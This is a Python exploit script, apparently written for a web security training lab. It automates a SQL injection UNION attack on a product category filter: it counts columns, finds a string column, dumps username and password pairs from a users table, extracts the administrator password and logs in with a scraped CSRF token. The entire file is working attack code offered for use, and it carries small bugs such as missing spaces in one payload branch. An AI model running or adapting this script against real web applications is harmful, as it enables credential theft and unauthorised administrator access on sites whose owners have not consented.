#!/usr/bin/python3

import requests
import sys
import re
import urllib3
import argparse
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_sqli_column_number(url, proxies=None):
    path="/filter?category=Corporate+gifts"
    for i in range(1,50):
        sql_payload = "'+ORDER+BY+%s--" %i
        r = requests.get(url+path+sql_payload,verify=False,proxies=proxies)
        if "Internal Server Error" in r.text:
            print(f"[V] Number of columns is: {i-1}")
            return i-1
    return False

def exploit_sqli_string_field(url, num_columns, proxies=None):
    path="/filter?category=Corporate+gifts"
    print(f"[*] Finding string field...")
    # try payload with NULL values
    null_payload = "' UNION SELECT " + "NULL," * (num_columns-1) + "NULL--"
    r = requests.get(url+path+null_payload, verify=False, proxies=proxies)
    if "Internal Server Error" not in r.text:
        print(f"[V] Found valid UNION SELECT with {num_columns} columns")
        # test each columns for string compatability
        for i in range(1, num_columns +1):
            # build payload with string test in each position
            select_parts = []
            for j in range(1, num_columns +1):
                if j ==i:
                    select_parts.append("'TEST'")
                else:
                    select_parts.append("NULL")
            payload = "' UNION SELECT " + ",".join(select_parts) + "--"
            r = requests.get(url+path+payload, verify=False, proxies=proxies)
            if "Internal Server Error" not in r.text:
                print(f"[V] Columns {i} can hold string data")
                return i #return first string column found
    print(f"[X] Could no find string field")
    return False

def exploit_sqli_users_table(url, proxies=None):
    path = '/filter?category=Corporate+gifts'
    # step 1: find number of columns
    num_columns = exploit_sqli_column_number(url, proxies)
    if not num_columns:
        print(f"[X] Could not determine number of columns")
        return None
    # step 2: finding string field
    string_column = exploit_sqli_string_field(url, num_columns, proxies)
    if not string_column:
        # if we can't find specific strings columns, try all columns as string
        print(f"[*] Trying with all columns as string...")
    # step 3: Retrieve username and password
    print(f"[*] Dumping username and password form user table...")
    
    # build payload based on number of columns
    if num_columns == 2:
        # if 2 columns, username and password directly / using valid sqli payload
        sqli_payload ="' UNION SELECT NULL, username || ':' || password FROM users--"
        print(f"[*] Using payload: {sqli_payload}")
    else:
        # if more than 2 columns, put other columns with NULL
        select_parts = []
        for i in range(1, num_columns + 1):
            if i == 2:
                select_parts.append("username || ':' || password")
            else:
                select_parts.append("NULL")
        sqli_payload ="' UNION SELECT"+ ",".join(select_parts) + "FROM users--"
        print(f"[*] Using payload: {sqli_payload}")
    
    r = requests.get(url+path+sqli_payload,verify=False, proxies=proxies)
    
    if 'administrator' in r.text.lower():
        print(f"[V] Found administartor credentials in response")
        # using regex pattern
        pattern = r'administrator[^a-zA-Z0-9]*([a-zA-Z0-9]+)'
        matches = re.findall(pattern, r.text, re.IGNORECASE)
        if matches:
            print(f"[V] Found via regex pattern: {matches[0]}")
            return matches[0]

    print(f"[X] Could not find administrator password in response")
    return None

# get csrf token to login
def get_csrf_token(sess,url):
    path_login ="/login"
    r = sess.get(url+path_login, verify=False,proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")["value"]
    print(f"[*] Take CSRF Token to Login: %s" %csrf)
    return csrf

# login as administrator
def login_as_administrator(sess,url,admin_password, proxies=None):
    csrf = get_csrf_token(sess,url)
    path_login ="/login"
    data = {
        "csrf":csrf,
        "username":"administrator",
        "password":admin_password
    }
    r = sess.post(url+path_login, data=data, verify=False, proxies=proxies)
    if "Log out" in r.text:
        return True
    else:
        return False

if __name__== "__main__":
    parser = argparse.ArgumentParser(description="SQL injection UNION attack, retrieving data from other tables")
    parser.add_argument("-u", "--url", help="Target URL(e.g., https://example/path)")
    parser.add_argument("--proxy", help="Proxy URL (e.g.,http://127.0.0.1:8080)", default=None)

    args = parser.parse_args()

    proxies = None
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        print(f"[*] Using Proxy: {args.proxy}")

    print(f"[*] Starting SQL Injection attack...")

    print(f"[*] Dumping the list of username and passwords...")
    admin_password = exploit_sqli_users_table(args.url.strip(), proxies)
    if not admin_password:
        print(f"[X] Did not find username and adminstrator password")
        sys.exit(1)

    print(f"[*] Attempting to login as Administrator")
    sess = requests.Session()
    if login_as_administrator(sess,args.url.strip(),admin_password,proxies):
        print(f"[V] Success Take Administrator's Page")
    else:
        print(f"[X] Failed Get an Administrator's Page")